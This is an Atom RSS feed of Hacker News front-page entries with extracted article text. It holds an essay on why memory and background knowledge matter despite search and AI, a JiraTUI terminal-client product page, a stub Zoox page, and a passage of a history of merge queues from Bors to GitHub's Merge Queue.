<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-09-10T20:36:48.024019+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45198420</id><title>We can’t circumvent the work needed to train our minds</title><updated>2025-09-10T20:38:36.641239+00:00</updated><content>&lt;doc fingerprint="6f4bb3f354154f28"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Scam Called “You Don't Have to Remember Anything”&lt;/head&gt;
    &lt;p&gt;Dear Zettlers,&lt;/p&gt;
    &lt;p&gt;This scam is decades old now and it is quite surprising that people still fall for it.&lt;/p&gt;
    &lt;p&gt;The search engines, old note-taking apps (you know, those with an elephant icon and the like) and AI have something in common: They claim that the effort of remembering things is outdated like using a candle in the age of electric light.&lt;/p&gt;
    &lt;p&gt;The following is, by the way, from my Zettelkasten (2016):&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;To find what you need online, you require a solid general education and, above all, prior knowledge in the area related to your search.1&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Original in German:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Was man braucht, um im Netz fündig zu werden, ist eine solide Grundbildung und vor allem Vorwissen in dem Bereich, in dem sich die Suche bewegt.&lt;/p&gt;&lt;lb/&gt;—Manfred Spitzer, Digitale Demenz1&lt;/quote&gt;
    &lt;p&gt;Culturally, it is increasingly the case that the first step is to go online, search for the a desired end result of a thinking process instead of engaging in learning. This means that we are using the internet less and less to our advantage, because we have less and less prior knowledge: We detrain ourselves out of the ability to access the quality of the information and turn it into actual knowledge.&lt;/p&gt;
    &lt;p&gt;Rowlands et al. wrote about the so called “digital natives” that they lack the critical and analytical thinking skills to evaluate the information they find on the internet.2 We need a fully developed mental map of the subject in order to derive value from the results of an internet search.&lt;/p&gt;
    &lt;p&gt;In short: You need a trained brain to actually benefit from the internet.&lt;/p&gt;
    &lt;p&gt;The advertised benefits of all these tools come with a specific hidden cost: Your ability to think.&lt;/p&gt;
    &lt;p&gt;Let’t take a closer look at the digital natives, since this issue is more accessible. They put themselves in a situation in which there is a vastly reduced incentive structure to evaluate the information critically. They use surface level indicators if the information matches the request. This behaviour has some obvious effects (in hindsight):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The reduced engagement with the material reduces the emotional weight of the whole line of action. You mind is an engine that is fuelled by emotion. Without any emotion, you don’t think. Rather, you try to imitate thinking efficiently.&lt;/item&gt;
      &lt;item&gt;The more you interact with information being emotionally disengaged and keeping it on the surface level, the more you develop the habit to engage with information in a way that it doesn’t change your brain.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So the more you work in a superficial way, the more brittle the knowledge foundation in your mind will be on which you base your cognitive actions.&lt;/p&gt;
    &lt;p&gt;This drives us to one of the most important conclusions of the entire field of note-taking, knowledge work, critical thinking and alike: You, not AI, not your PKM or whatever need to build the knowledge because only then it is in your brain and you can go the next step.&lt;/p&gt;
    &lt;p&gt;Let me try to give you a demonstration of the issue:&lt;/p&gt;
    &lt;p&gt;I asked ChatGPT to design an optimal weekly training schedule for health span and fitness. This is the answer:&lt;/p&gt;
    &lt;p&gt;Here’s a table outlining the optimal weekly workout schedule for health span and longevity based on the assumption that you should focus on aerobic capacity, muscle strength, mobility/flexibility, and neuromuscular coordination:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Day&lt;/cell&gt;
        &lt;cell role="head"&gt;Workout Type&lt;/cell&gt;
        &lt;cell role="head"&gt;Focus&lt;/cell&gt;
        &lt;cell role="head"&gt;Duration&lt;/cell&gt;
        &lt;cell role="head"&gt;Details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Monday&lt;/cell&gt;
        &lt;cell&gt;Full-Body Strength Training&lt;/cell&gt;
        &lt;cell&gt;Muscle mass, metabolic health&lt;/cell&gt;
        &lt;cell&gt;45–60 min&lt;/cell&gt;
        &lt;cell&gt;Warm-up: Dynamic stretches (5 min) - Squats, Deadlifts, Push-ups, Pull-ups (3x 8–12 reps) - Core: Plank (3x 30–60 sec) - Cool-down: Static stretches (5 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Tuesday&lt;/cell&gt;
        &lt;cell&gt;Low-Intensity Cardio &amp;amp; Mobility&lt;/cell&gt;
        &lt;cell&gt;Heart health, joint function&lt;/cell&gt;
        &lt;cell&gt;30–60 min&lt;/cell&gt;
        &lt;cell&gt;Brisk walking, cycling, or swimming (30–45 min) - Yoga or joint mobility exercises (15 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Wednesday&lt;/cell&gt;
        &lt;cell&gt;High-Intensity Interval Training (HIIT)&lt;/cell&gt;
        &lt;cell&gt;Cardiovascular fitness, metabolism&lt;/cell&gt;
        &lt;cell&gt;20–30 min&lt;/cell&gt;
        &lt;cell&gt;Warm-up: Light jogging (5 min) - 30 sec sprint / 90 sec walk (15–20 min) OR Bodyweight circuit (40 sec on/20 sec rest) - Cool-down: Stretching (5 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Thursday&lt;/cell&gt;
        &lt;cell&gt;Active Recovery &amp;amp; Balance&lt;/cell&gt;
        &lt;cell&gt;Recovery, neuromuscular coordination&lt;/cell&gt;
        &lt;cell&gt;30–45 min&lt;/cell&gt;
        &lt;cell&gt;Easy yoga, tai chi, or a nature walk (20–30 min) - Balance drills: Single-leg stands, heel-to-toe walking (10–15 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Friday&lt;/cell&gt;
        &lt;cell&gt;Upper-Body Strength &amp;amp; Core&lt;/cell&gt;
        &lt;cell&gt;Upper-body strength, core stability&lt;/cell&gt;
        &lt;cell&gt;45–60 min&lt;/cell&gt;
        &lt;cell&gt;Warm-up: Arm/shoulder stretches (5 min) - Overhead Press, Pull-ups, Push-ups, Rows (3x 8–12 reps) - Core: Russian twists or bird-dogs (3 sets) - Cool-down: Static stretches (5 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Saturday&lt;/cell&gt;
        &lt;cell&gt;Moderate-Intensity Cardio&lt;/cell&gt;
        &lt;cell&gt;Endurance, cardiovascular health&lt;/cell&gt;
        &lt;cell&gt;45–60 min&lt;/cell&gt;
        &lt;cell&gt;Steady activity: Jogging, cycling, swimming, rowing, or hiking (60–70% max heart rate) - Cool-down: Easy pace and stretches (5 min)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Sunday&lt;/cell&gt;
        &lt;cell&gt;Mobility &amp;amp; Flexibility&lt;/cell&gt;
        &lt;cell&gt;Recovery, flexibility&lt;/cell&gt;
        &lt;cell&gt;30–60 min&lt;/cell&gt;
        &lt;cell&gt;Yoga session focusing on stretching major muscle groups - Foam rolling or myofascial release&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Looks good alright? Or does it? How do you know? You can’t if you don’t have sufficient background knowledge. Here is a little quiz if you have the sufficient background knowledge:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;How do volume and intensity factor in strength gains?&lt;/item&gt;
      &lt;item&gt;What is the difference between aerobic capacity and aerobic power?&lt;/item&gt;
      &lt;item&gt;How do you weigh each minute spend on flexibility against the minutes spent on aerobic capacity and strength?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you can’t produce a comprehensive answer with confidence and on the whim the second you read the question, you don’t have the sufficient background knowledge.&lt;/p&gt;
    &lt;p&gt;“I just ask ChatGPT for that, too!”, the AI generation might ask. Ok, and then what? How can you assess the answers to those three questions (which represent only a fraction of needed knowledge!)?&lt;/p&gt;
    &lt;p&gt;What is going wrong? You are taking on an impossible task, because you can’t use enough of your brain for your cognitive operations. Assuming that you have no comprehensive knowledge in health and fitness, terms like “aerobic capacity” or “core stability” only activate some superficial level associations. But if you are deeply involved with the topic the term “aerobic capacity” activates way more. Here are some examples (just a small fraction):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Two discussions of Olaf Alexander Bu on the difference between capacity and power numbers in measuring endurance performances.&lt;/item&gt;
      &lt;item&gt;A mental map on the aerobic metabolism.&lt;/item&gt;
      &lt;item&gt;The tension between peripheral endurance improvements (like mitochondrial biogenesis) central improvements (like improved cardiac output) and their connection (like angiogenesis)&lt;/item&gt;
      &lt;item&gt;The still ongoing discussion between low intensity exercise and high intensity exercise as the best tool to build aerobic capacity for the non-professional athlete.&lt;/item&gt;
      &lt;item&gt;The differences between running, cycling, rowing and all the other movements to build aerobic capacity.&lt;/item&gt;
      &lt;item&gt;An open task to review a paper on interval length that you found in “Textbook of Work Physiology” by Astrand and Rodahl.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a small fraction of what I can observe in my mind and there is a lot more going on unconsciously. Now consider that I might be very well-read in the domain of health and fitness. But multiply this by a factor of 100 if you replace me with an expert like Olaf Alexander Bu when it comes to the term “aerobic capacity”.&lt;/p&gt;
    &lt;p&gt;In knowledge work the bottleneck is not the external availability of information. It is the internal bandwidth of processing power which is determined by your innate abilities and the training status of your mind.&lt;/p&gt;
    &lt;p&gt;So, coming back to the initial starting point that “you don’t have to remember anything”. The opposite is true.&lt;/p&gt;
    &lt;p&gt;You have to remember EVERYTHING. Only then you can perform the cognitive tasks necessary to perform meaningful knowledge work.&lt;/p&gt;
    &lt;p&gt;The way you train your mind is the way your mind can perform. Simple tools like spaced repetition allow your mind to perform simple tasks, complex tools like the Zettelkasten Method allow your mind to master complex tasks. Remember my mantra of depth of processing? Perhaps, you can rephrase it to train your mind for depth.&lt;/p&gt;
    &lt;p&gt;The field of knowledge work will not advance if we don’t come to terms that we can’t circumvent the work needed to train our minds.&lt;/p&gt;
    &lt;p&gt;Live long and prosper &lt;lb/&gt; Sascha&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Manfred Spitzer (2012): Digitale Demenz. Wie wir uns und unsere Kinder um den Verstand bringen, Munich: Droemer, S. 211. ↩ ↩2&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Ian Rowlands, David Nicholas, Peter Williams, Paul Huntington, Maggie Fieldhouse, Barrie Gunter, Richard Withey, Hamid R. Jamali, Tom Dobrowolski, and Carol Tenopir (2008): The Google generation: the information behavior of the researcher of the future, Aslib Proceedings 4, 2008, Vol. 60, pp. 290-310. ↩&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://zettelkasten.de/posts/the-scam-called-you-dont-have-to-remember-anything/"/></entry><entry><id>https://news.ycombinator.com/item?id=45198481</id><title>Jiratui – A Textual UI for interacting with Atlassian Jira from your shell</title><updated>2025-09-10T20:38:36.476454+00:00</updated><content>&lt;doc fingerprint="bc88fcbee9558aaa"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Where Jira Meets the Command Line&lt;/head&gt;
    &lt;p&gt;JiraTUI revolutionizes task management for developers by enabling seamless interaction with Jira from the terminal. Create, update, and track tasks efficiently, all while maintaining focus on your code and workflow.&lt;/p&gt;
    &lt;head rend="h1"&gt;Features&lt;/head&gt;
    &lt;head rend="h3"&gt;Search Tasks&lt;/head&gt;
    &lt;p&gt;Quickly locate your Jira tasks using the powerful search functionality in JiraTUI. With just a few commands, you can filter tasks by status, assignee, or priority. This feature saves time and enhances productivity, allowing you to focus on what matters most in your projects.&lt;/p&gt;
    &lt;head rend="h3"&gt;Create Tasks&lt;/head&gt;
    &lt;p&gt;Easily create new Jira tasks directly from the terminal with JiraTUI. This feature simplifies the task creation process, enabling you to specify details like title, description, and priority in a streamlined manner. Spend less time navigating interfaces and more time getting things done.&lt;/p&gt;
    &lt;head rend="h3"&gt;Update Tasks&lt;/head&gt;
    &lt;p&gt;Keep your tasks up to date effortlessly with JiraTUI's update feature. Modify task details such as status, assignee, summary, labels and due dates directly from the command line. This functionality ensures that your project remains organized and current, enhancing collaboration and workflow efficiency.&lt;/p&gt;
    &lt;head rend="h3"&gt;Comments&lt;/head&gt;
    &lt;p&gt;Engage with your team by managing comments on tasks through JiraTUI. Add or delete comments directly from the terminal, fostering clear communication and collaboration. This feature helps keep discussions organized and accessible, ensuring everyone stays informed about task progress.&lt;/p&gt;
    &lt;head rend="h3"&gt;Manage Related Tasks&lt;/head&gt;
    &lt;p&gt;Easily manage related tasks with JiraTUI, allowing you to link and unlink tasks directly from the terminal. This feature helps you visualize dependencies and relationships between tasks, ensuring a more cohesive project management experience and improving overall workflow.&lt;/p&gt;
    &lt;head rend="h3"&gt;JQL Search&lt;/head&gt;
    &lt;p&gt;Leverage the power of Jira Query Language (JQL) with JiraTUI to perform advanced searches. This feature allows you to create complex queries to filter tasks based on specific criteria, providing greater flexibility and precision in managing your projects and enhancing your productivity. Expressions can be saved to use at any time.&lt;/p&gt;
    &lt;head rend="h1"&gt;Advantages&lt;/head&gt;
    &lt;p&gt;Discover the key advantages of JiraTUI that make it an essential tool for developers seeking efficient and effective task management.&lt;/p&gt;
    &lt;head rend="h3"&gt;Configurable&lt;/head&gt;
    &lt;p&gt;JiraTUI is highly configurable, allowing users to tailor the tool to their specific needs. Customize command shortcuts, settings, and preferences to create a personalized experience that enhances productivity. This flexibility ensures that JiraTUI adapts to your workflow, making it a perfect fit for any development environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Simplicity&lt;/head&gt;
    &lt;p&gt;JiraTUI offers a straightforward command-line interface that simplifies task management. By eliminating unnecessary clicks and navigation, it allows developers to focus on their work. The intuitive commands make it easy to perform actions quickly, ensuring that managing Jira tasks is a seamless part of your development workflow.&lt;/p&gt;
    &lt;head rend="h3"&gt;Speed&lt;/head&gt;
    &lt;p&gt;Experience unparalleled speed with JiraTUI, designed for efficiency in task management. The command-line interface allows for rapid execution of commands, enabling developers to create, update, and search tasks in seconds. This speed not only saves time but also enhances overall productivity, allowing you to focus on delivering quality work.&lt;/p&gt;
    &lt;head rend="h3"&gt;Easy to Use&lt;/head&gt;
    &lt;p&gt;JiraTUI is designed with user-friendliness in mind, making it accessible for developers of all skill levels. The clear command structure and helpful prompts guide users through task management effortlessly. With minimal learning curve, you can quickly harness the power of JiraTUI and integrate it into your daily workflow.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://jiratui.sh/"/></entry><entry><id>https://news.ycombinator.com/item?id=45199031</id><title>Zoox robotaxi launches in Las Vegas</title><updated>2025-09-10T20:38:36.128019+00:00</updated><content>&lt;doc fingerprint="242dc48820c848de"&gt;
  &lt;main&gt;
    &lt;p&gt;Skip to content How To Ride Where to Ride Know Your Ride Support GET THE APP&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://zoox.com/journal/las-vegas"/></entry><entry><id>https://news.ycombinator.com/item?id=45199378</id><title>The origin story of merge queues</title><updated>2025-09-10T20:38:35.793269+00:00</updated><content>&lt;doc fingerprint="27d0a584cdb004cb"&gt;
  &lt;main&gt;
    &lt;p&gt;From Bors and Homu to Bulldozer, Kodiak, Mergify, and now GitHub and GitLab, merge queues have shaped how we keep main branches green. This article traces their history, why they emerged, and how they became a standard in modern software development.&lt;/p&gt;
    &lt;p&gt;If you use GitHub or GitLab today, merge queues feel like a built-in feature of modern development. But their story goes back over a decade, long before "merge queue" was a product term.&lt;/p&gt;
    &lt;p&gt;It started with a simple problem: How do you keep your main branch green when dozens of developers are merging code simultaneously? Continuous integration clarified that "just merge and hope" wasn't good enough. The solution wasn't a new testing framework but a new workflow.&lt;/p&gt;
    &lt;p&gt;From early scripts in the Rust project (Bors, Homu) to Shopify's Shipit, to modern SaaS offerings like Mergify and built-in queues from GitHub and GitLab, merge queues evolved out of necessity. What began as side-project bots has become a standard practice for engineering teams at scale.&lt;/p&gt;
    &lt;p&gt;This post walks through that history â the motivations, the people behind it, and how these tools shaped the way we merge code today.&lt;/p&gt;
    &lt;head rend="h2"&gt;The "Not Rocket Science" Rule and Early Experiments&lt;/head&gt;
    &lt;p&gt;The idea of a merge queue â automatically ensuring that a main branch is never broken by merged changes â can be traced back over two decades. In the early 2000s, developer Ben Elliston devised a system of cron jobs, multiple repositories, and a database to "automatically maintain a repository of code that always passes all the tests". This approach, later dubbed the "Not Rocket Science Rule of Software Engineering," kept a known-good code branch for developers and customers, preventing the headaches of broken main builds.&lt;/p&gt;
    &lt;p&gt;Fast forward to 2013: Graydon Hoare (creator of the Rust language) faced a similar challenge as Rust's contributor base grew. Remembering Elliston's rule, Hoare implemented a small bot named Bors to enforce it. Bors integrated with Rust's build farm and GitHub: it would monitor pull requests, wait for a reviewer's "approve" command, merge the PR into a temporary branch, and run the full test suite. If tests passed, Bors would fast-forward the main branch to that tested merge commit; if not, it would report the failure and leave the main branch untouched. This ensured that Rust's master branch was always green (always passing tests). The motivation was to avoid "merge skew," where changes appear compatible when reviewed in isolation but break once merged into an updated main. (A classic example of merge skew is two PRs that individually pass tests â one renames a function, and another adds a call to the old name, resulting in a broken main after sequential merges). By "testing it first, then promoting it" to main, Bors kept Rust's primary branch stable without human intervention to update or revert commits.&lt;/p&gt;
    &lt;p&gt;Rust's experience proved the concept's value. As Hoare noted, the approach "is not rocket science" â it's just tedious to do manually, hence ripe for automation. Bors' success meant that by 2014 the Rust and Mozilla Servo projects were using such bots to gate all merges on tests. However, Bors itself was a quick script, and the need for a more extensible solution soon became apparent.&lt;/p&gt;
    &lt;head rend="h2"&gt;Rust's Homu and the Rise of Merge Bots&lt;/head&gt;
    &lt;p&gt;To build a more general tool, Rust contributor Barosl Lee created Homu as a reimplementation and extension of the original Bors bot. Homu was designed to be generic (not Rust-specific) and easier for others to adopt. It implemented the same core idea: maintain a tested integration branch (often called "auto") that includes pending PRs, and only fast-forward &lt;code&gt;main&lt;/code&gt; to &lt;code&gt;auto&lt;/code&gt; when tests on &lt;code&gt;auto&lt;/code&gt; pass. In practice, Homu reversed the usual merge process: instead of merging a PR then testing, it tested the PR before it landed on main by temporarily combining it with the up-to-date main branch. This ensured that "the main branch is always a copy of &lt;code&gt;auto&lt;/code&gt; that passed all tests, processing approved PRs one at a time in order.&lt;/p&gt;
    &lt;p&gt;Homu was open source and quickly became integral to Rust's workflow (Rust's own Homu instance was named "bors"). In 2015, Barosl even launched Homu as a service (homu.io), making it easy for other open-source projects to use a hosted merge queue bot. This service gained users in various communities, demonstrating a broader demand for maintaining green main branches. Homu's design was language-agnostic, so projects beyond Rust/Servo could adopt it with their CI systems.&lt;/p&gt;
    &lt;p&gt;However, by around 2018, the original Homu service began to stagnate. The maintainer stopped updating it, the web frontend's source was lost, and eventually the homu.io domain expired. Some projects (like Rust itself) forked and maintained their own Homu instances, but there was clearly room for a modern replacement. This set the stage for the next evolution of merge queue tools.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bors-NG: Modern Successor to Homu&lt;/head&gt;
    &lt;p&gt;Enter Bors-NG (Bors "Next Generation"), created by Michael Howell. Bors-NG was a complete open-source replacement for Homu, first released around 2017. It was built to be faster, more user-friendly, and easier to host, while preserving the same core idea of tested-then-merged pull requests. Unlike homu.io, Bors-NG had no closed-source components â the public instance at &lt;code&gt;app.bors.tech&lt;/code&gt; ran the same code that anyone could self-host.&lt;/p&gt;
    &lt;p&gt;Bors-NG quickly became popular, especially for teams on GitHub that needed a merge queue before GitHub offered any native solution. Many saw it as the "spiritual successor to Homu, the original Rust merge bot". It integrated with GitHub pull requests and CI services, allowing maintainers to use the familiar &lt;code&gt;bors r+&lt;/code&gt; command to enqueue PRs for merging once tests pass. For years, this combo of Bors-NG + CI filled a critical gap, giving projects large and small a way to avoid merge skew and keep their main branch healthy.&lt;/p&gt;
    &lt;p&gt;Notably, the Kubernetes project developed a similar concept in parallel â their Prow/Tide system â and other communities like OpenStack had long used a gating bot (Zuul) for Gerrit. These all share the same philosophy pioneered by Bors. Merge queues became recognized as best practice for high-velocity projects where broken merges are unacceptable.&lt;/p&gt;
    &lt;p&gt;By 2023, however, the landscape changed: GitHub announced its own merge queue feature (more on that later). The author of Bors-NG announced the public Bors-NG service would be deprecated in favor of GitHubâs native Merge Queue. While Bors-NG remains open source for self-hosters, the availability of an official tool signaled a shift. It was a full-circle moment â a concept that started as a community hack had become mainstream enough for GitHub itself to support it out-of-the-box.&lt;/p&gt;
    &lt;head rend="h2"&gt;Industry Solutions: Bulldozer, Mergify, and Kodiak&lt;/head&gt;
    &lt;p&gt;In parallel to the Rust community's bots, other engineers and companies were solving the same problem, often "scratching their own itch." This gave rise to several notable merge automation tools in the late 2010s:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Bulldozer (2017): Developers at Palantir created Bulldozer as a GitHub App to automate merging and updating PRs. Palantir open-sourced the tool, which could be self-hosted or installed on repos. Bulldozer automatically merges pull requests when all required checks and reviews are satisfied, and it can also auto-update PR branches to keep them in sync with the base branch. Essentially, it removes the manual "update and merge" drudgery in a fast-moving trunk-based development workflow. An example use case is at ACV Auctions, where engineers adopted Palantir's Bulldozer to ensure everyone's feature branch stays up-to-date with&lt;/p&gt;&lt;code&gt;main&lt;/code&gt;and merges immediately once tests pass (They noted that for public GitHub usage, Bulldozer could be run as a custom instance, as it wasn't officially listed on the marketplace at the time)&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Mergify (2018): That's us! Frustration with manual PR management led Julien Danjou and Mehdi Abaakouk to build a small merge automation tool for their team in 2018. That side project struck a chord and soon evolved into Mergify, a full-fledged SaaS product and company. Mergify introduced features to queue, update, and merge PRs with flexible rules, effectively bringing merge queues to any GitHub repository via a cloud service. The founders (long-time open source contributors) initially open-sourced Mergify's code and offered it free for OSS projects. Over the years, Mergify became a popular "CI companion" for teams worldwide, offering advanced queue configurations, priority rules, batch merging, and more on top of GitHub's API. It was essentially "merge queue as a service," well before GitHub's native feature. (As an aside, Mergify's engine was eventually made closed-source in 2022 as the business matured, but it continues to serve thousands of developers.)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Kodiak (2019): In early 2019, developer Christopher Blump faced constant delays from having to rebase and update PRs in a busy repo with an always-green main policy. He evaluated existing tools like Bulldozer and others, even contributing a patch, but found "none of the existing projectsâ¦ solved the problem of efficiently updating and merging pull requests." So during his college finals in May 2019, he built the first version of Kodiak. Kodiak is an open-source GitHub App that automates the âupdate with latest main and merge if tests pass" dance. It introduced a proper queue to merge PRs in order, eliminating the race condition when multiple developers try to merge at once. The initial version was basic (queue in memory, no persistent state) but solved the pain point. By that summer, Kodiakâs usefulness caught on â it got a considerable boost when Vercelâs CEO tweeted about using it to auto-merge and deploy changes. This endorsement in July 2019 brought a wave of adopters, and Kodiak rapidly grew via word-of-mouth in the open-source community. Kodiak added features like configuration files, persistent queues, and GitHub checks for transparency. It became another popular option for teams wanting a hosted merge bot, though it is not actively maintained anymore.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These tools all shared a common purpose: to safely remove human bottlenecks in merging PRs. They watched for PRs meeting defined conditions (CI passes, approvals present, specific labels, etc.) and then automatically merged them in a controlled way. Many could also keep branches rebased or updated to prevent stale merges. In effect, they implemented merge queues or merge trains outside of the platform â a testament to how universal the need had become by 2018â2019.&lt;/p&gt;
    &lt;p&gt;It's worth noting that GitLab users were also early to this idea: GitLab introduced an official Merge Trains feature in mid-2019 (GitLab Premium 12.0) to queue merge requests and run "pipelines for merge results" on each in sequence. This was GitLab's integrated solution to guarantee that each MR is tested with all prior changes before landing, much like Bors/Homu's approach. Merge Trains made it easy to auto-merge a series of MRs without breaking the target branch, and even supported batching multiple MR commits into one pipeline run for efficiency. In other words, by 2019 the concept of merge queues had leapt from niche bots to built-in VCS platform features â at least on GitLab.&lt;/p&gt;
    &lt;head rend="h2"&gt;Internal Merge Queues in Tech Giants&lt;/head&gt;
    &lt;p&gt;Large-scale organizations soon recognized that hand-rolling merge queues was often the only way to keep their main branches stable amid heavy developer activity. Uber, for instance, built a system called SubmitQueue to verify and land changes in their monorepo, reducing CI wait times by 74% and dramatically improving merge throughput while keeping the mainline green. Shopify, working on a massive Rails-based monolith, added a merge queue into their deployment tool, Shipit, to prevent accidental merges during backlog surges and maintain pipeline reliability. Similarly, Strava created an internal tool dubbed Butler, a CI-integrated merge queue that enforces orderly merging for their fast-moving engineering teams.&lt;/p&gt;
    &lt;p&gt;At Shopify, developers gave positive feedback early on: âBy getting automation involved earlier in the pipeline, we were able to take some of the load off our developers, make them happier, and more productive.â In fact, over 90% of pull requests to Shopifyâs core application now use the Shipit Merge Queue. This demonstrates how merge queues arenât just technical enablersâthey improve engineering experience at scale.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mainstream Adoption: GitHub's Merge Queue&lt;/head&gt;
    &lt;p&gt;Given the success of these systems, it was perhaps only a matter of time before GitHub provided native support. Historically, GitHub's stance was more manual: they added a basic "Auto-merge" option in late 2020 that lets a PR merge after checks pass. However, that still didn't handle multiple PRs interacting or ensure rebasing. The true paradigm shift came in 2022â2023.&lt;/p&gt;
    &lt;p&gt;GitHubâs own Merge Queue wasnât born from product planningâit was born from internal necessity. By 2016, GitHub engineers were merging nearly 1,000 pull requests per month into their expansive monorepo. The resulting chaos mandated a smarter system. What emerged was the concept of a "train" â a bundle of PRs tested, deployed, and merged together under human orchestration. This was a precursor to today's fully automated queues. An internal shift began in 2020, when multiple teams pooled efforts to streamline PR merging across internal projects. By mid-2021, GitHub piloted a merge queue in smaller repos and, by 2023, had rolled out an internal system powering thousands of merges monthlyâcutting average wait times by 33% and calling the Merge Queue "one of the best quality-of-life improvements" they'd seen&lt;/p&gt;
    &lt;p&gt;Then, GitHub decided to release its internal merge queue as part of its product. They began experimenting with a first-party Pull Request Merge Queue (PRMQ). After a closed beta, in February 2023, GitHub released its merge queue feature in public beta, and by July 2023, it was generally available.&lt;/p&gt;
    &lt;p&gt;GitHub's Merge Queue closely mirrors the principles established by Bors and others: it maintains a queue of PRs waiting to merge. It ensures each PR is tested in a merged state (often by creating a temporary merge branch for the PR and running CI) before it lands on the base branch. In effect, it automates the formerly tedious process of constantly rebasing or updating PRs and serializing their merges. As GitHub's announcement put it, developers used to have to update their feature branches one-by-one and re-run CI to avoid breaking main; "Merge Queue automates this process" by queuing PRs and testing them with any earlier queued changes. The result is higher velocity and confidence that incompatible changes never break the default branch.&lt;/p&gt;
    &lt;p&gt;The introduction of GitHub's own merge queue was a watershed moment. It validated the approach pioneered by community tools and brought it to a much broader audience. Organizations on GitHub Enterprise Cloud or public open-source projects can now simply toggle on a merge queue in settings, without needing an external bot. The impact was immediately felt: maintainers of Bors-NG announced the phase-out of their hosted service in favor of GitHub's queue, and guidelines for migrating from Bors to GH Merge Queue emerged. Essentially, the ecosystem came full circle â what started as a custom script to enforce an "always-green" rule evolved into a standard platform feature.&lt;/p&gt;
    &lt;p&gt;It's important to note that GitHub's initial implementation has some differences in workflow. For example, GH Merge Queue uses a two-phase testing approach (one run on the PR itself, and a second run after queueing when merged into a temporary branch) whereas tools like Bors performed a single integrated test cycle. There are also limitations: among others, GitHub's queue is FIFO only (no priority reordering) and lacks batch merging capabilities. Third-party services like Mergify have pointed out these gaps quickly, since their products offer more advanced queue configurations (multiple queues, priority rules, batching to merge several PRs at once, etc.). In fact, even after GitHub's native queue launch, some teams continued to use or switch to tools like Mergify or others for more flexibility. Nonetheless, the core need is now officially recognized and supported by GitHub, a significant milestone in the history of merge queues.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion: From Niche Scripts to Essential Workflow&lt;/head&gt;
    &lt;p&gt;In a little over a decade, merge queue systems have gone from an obscure hack to an essential part of modern software delivery. The progression tells a story of increasing scale and quality demands:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Early 2010s: Only very large or risk-averse projects (like Rust, Servo, or OpenStack) felt the pain strongly enough to build bespoke solutions (Bors, Homu, Zuul) to guarantee unbreakable main branches. These were novel, community-driven efforts born out of necessity â enforcing the "always passes all tests" rule that was known but rarely automated.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Late 2010s: As continuous integration became ubiquitous and teams adopted trunk-based development, the merge skew problem became more common across the industry. This spurred a wave of tools â some open-source, some commercial â to automate PR merging (Bulldozer, Mergify, Kodiak, and others). They enabled even smaller teams to achieve what only giants could before: continuously integrating code without constantly babysitting CI or worrying about conflicting changes. The fact that a lone developer could write Kodiak in a weekend to solve his team's annoyance, and that it immediately found a user base, speaks to how widespread the need had become.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2020s: Merge queues became mainstream best practice. Platform support (GitLab's Merge Trains, GitHub's Merge Queue) lowered the barrier to adoption. Today, even teams that never heard of "bors" or "homu" are benefiting from the lessons those tools taught. On GitHub, you can simply enable a branch protection that uses a merge queue, and achieve the same guarantee that âthe main branch is never broken by incompatible changes.â The ecosystem around merge automation is still evolving â with third-party services pushing the envelope on features â but the fundamental approach is here to stay.&lt;/p&gt;
